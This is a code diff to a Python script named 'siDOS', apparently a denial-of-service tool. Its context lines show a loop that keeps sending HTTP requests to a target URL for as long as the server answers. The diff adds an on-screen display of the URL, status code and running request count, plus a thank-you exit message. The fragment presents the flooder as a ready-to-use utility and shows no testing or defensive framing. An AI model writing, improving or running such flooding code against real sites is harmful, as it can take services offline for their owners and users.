@@ -35,15 +35,32 @@ def doRequests():
     datasend = requests.post(url, allow_redirects=False)
     httpcode = datasend.status_code
     counter = 0
+    hudrefresh = 0
+    starthud = 1
     while httpcode == 200:
         try:
             datasend = requests.get(url, allow_redirects=False)
             httpcode = datasend.status_code
             counter += 1
+            hudrefresh += 1
+            if counter >= 10 and hudrefresh == 500:
+                hudrefresh = 0
+                os.system(clear)
+                print("URL: " + url)
+                print("HTTPCode: {0}".format(httpcode))
+                print("Requests: " + str(counter))
+                print("\nPress ctrl+c to stop sending requests")
+            elif starthud == 1:
+                starthud = 0
+                os.system(clear)
+                print("URL: " + url)
+                print("HTTPCode: {0}".format(httpcode))
+                print("Requests: " + str(counter))
+                print("\nPress ctrl+c to stop sending requests")
         except ValueError:
             sys.exit()
         except KeyboardInterrupt:
-            print("URL: " + url)
+            print("\nURL: " + url)
             print("Requests: " + str(counter))            
             print("Thank you for using siDOS !")
             sys.exit()
